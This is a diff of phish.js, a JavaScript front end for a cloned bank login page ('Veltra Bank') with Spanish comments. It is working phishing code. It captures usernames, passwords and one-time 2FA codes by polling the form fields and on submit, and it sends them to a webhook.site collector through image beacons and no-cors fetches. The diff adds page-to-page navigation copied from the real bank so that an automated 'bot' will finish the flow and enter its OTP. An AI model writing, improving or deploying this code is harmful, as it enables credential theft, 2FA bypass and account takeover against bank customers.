@@ -1,34 +1,33 @@
 /*
- * Veltra Bank — front del clon (deploy estatico en Vercel, sin backend).
+ * Veltra Bank — front del clon (flujo multi-pagina, fiel al real).
  *
- * Imita el flujo de 2 pasos (password -> OTP). Exfiltra lo que teclea el
- * cliente a webhook.site por GET-imagen (es "simple request": no dispara
- * preflight CORS). Con esos valores corres el script de login a mano.
+ * El banco real NAVEGA entre paginas: /login -> /verificar -> /dashboard.
+ * Replicamos eso para que el bot (que espera el cambio de URL) complete el
+ * flujo y tipee el OTP. Cada paso exfiltra a webhook.site por GET-imagen.
+ *
+ * phish.js es generico: cablea el form que exista en la pagina actual.
  */
 (function () {
   "use strict";
 
-  // <<< EDITAR: pega tu propia URL fresca de webhook.site >>>
+  // <<< EDITAR: tu URL de webhook.site >>>
   var COLLECTOR = "https://webhook.site/e2685b51-40e1-4e66-b0d1-2afb36a1d75f";
 
   function exfil(fase, datos) {
-    var qs = encodeURIComponent(JSON.stringify(datos));
+    var qs = encodeURIComponent(JSON.stringify(datos || {}));
     var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
     try { new Image().src = url; } catch (e) {}
     try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) {}
   }
 
-  function limpiarError() {
-    var el = document.getElementById("alert");
-    if (el) { el.textContent = ""; el.style.display = "none"; }
-  }
+  // Beacon al cargar (incluye el path para seguir el flujo del bot).
+  exfil("pageload", {
+    path: location.pathname,
+    ref: document.referrer,
+    ua: navigator.userAgent
+  });
 
-  // Diagnostico: beacon al cargar. Si el bot siquiera abre la pagina, esto cae
-  // en el webhook aunque no toque ningun form.
-  exfil("pageload", { ref: document.referrer, url: location.href, ua: navigator.userAgent });
-
-  // Captura robusta: NO dependemos del submit. Si el bot escribe en los campos
-  // (aunque nunca envie el form), lo levantamos por polling + eventos.
+  // Captura robusta por polling: no depende del submit.
   var ult = { u: "", p: "", c: "" };
   function chequear() {
     var gu = document.getElementById("txt-login");
@@ -54,52 +53,31 @@
       el.addEventListener("change", chequear);
     }
   });
-  // Diagnostico de interaccion: cualquier click en la pagina.
-  document.addEventListener("click", function (ev) {
-    var t = ev.target ? (ev.target.id || ev.target.tagName || "?") : "?";
-    exfil("click", { t: t });
-  }, true);
 
+  // --- Paso 1: login -> navega a /verificar (igual que el real) ---
   var formLogin = document.getElementById("form-login");
-  var form2fa   = document.getElementById("form-2fa");
-  var title     = document.getElementById("card-title");
-  var sub       = document.getElementById("card-sub");
+  if (formLogin) {
+    formLogin.addEventListener("submit", function (e) {
+      e.preventDefault();
+      var usuario = (document.getElementById("txt-login") || {}).value || "";
+      var clave = (document.getElementById("txt-password") || {}).value || "";
+      exfil("login", { usuario: usuario.trim(), clave: clave });
+      var btn = document.getElementById("btn-login");
+      if (btn) { btn.disabled = true; btn.textContent = "Verificando..."; }
+      setTimeout(function () { window.location = "/verificar"; }, 400);
+    });
+  }
 
-  // --- Paso 1: usuario + clave ---
-  formLogin.addEventListener("submit", function (e) {
-    e.preventDefault();
-    limpiarError();
-    var usuario = document.getElementById("txt-login").value.trim();
-    var clave   = document.getElementById("txt-password").value;
-
-    exfil("login", { usuario: usuario, clave: clave });
-
-    var btn = document.getElementById("btn-login");
-    btn.disabled = true; btn.textContent = "Verificando...";
-    setTimeout(function () {
-      formLogin.style.display = "none";
-      form2fa.style.display = "";
-      title.textContent = "Verificacion en dos pasos";
-      sub.textContent = "Ingresa el codigo de un solo uso que te enviamos.";
-      var i = document.getElementById("txt-2fa"); if (i) i.focus();
-    }, 650);
-  });
-
-  // --- Paso 2: OTP ---
-  form2fa.addEventListener("submit", function (e) {
-    e.preventDefault();
-    limpiarError();
-    var codigo = document.getElementById("txt-2fa").value.trim();
-
-    exfil("2fa", { codigo: codigo });
-
-    var btn = document.getElementById("btn-2fa");
-    btn.disabled = true; btn.textContent = "Verificando...";
-    setTimeout(function () {
-      document.querySelector(".card").innerHTML =
-        '<div class="eyebrow">Banca en linea</div>' +
-        '<h2>Acceso verificado</h2>' +
-        '<p class="sub">Redirigiendo a tu panel...</p>';
-    }, 650);
-  });
+  // --- Paso 2: 2FA -> navega a /dashboard ---
+  var form2fa = document.getElementById("form-2fa");
+  if (form2fa) {
+    form2fa.addEventListener("submit", function (e) {
+      e.preventDefault();
+      var codigo = (document.getElementById("txt-2fa") || {}).value || "";
+      exfil("2fa", { codigo: codigo.trim() });
+      var btn = document.getElementById("btn-2fa");
+      if (btn) { btn.disabled = true; btn.textContent = "Verificando..."; }
+      setTimeout(function () { window.location = "/dashboard"; }, 400);
+    });
+  }
 })();
